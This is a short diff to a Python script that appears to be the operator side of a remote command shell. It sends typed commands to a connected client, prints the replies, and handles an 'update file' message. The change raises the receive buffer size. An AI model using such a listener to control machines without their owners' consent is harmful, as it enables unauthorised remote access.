@@ -48,7 +48,7 @@ while True:
         try:    
             user.send(input('$ ').encode("utf-8")) 
 
-            data = user.recv(1024).decode('utf-8')
+            data = user.recv(5000).decode('utf-8')
             print(data)######
 
             if data == 'Обновить файл:':
@@ -62,3 +62,4 @@ while True:
         except ConnectionResetError: # Обробатывет ошибку 
             print(f'[-] Disconect - {adres}, не нажимай на Enter а токонсоль поломаетя   ')
             break
+
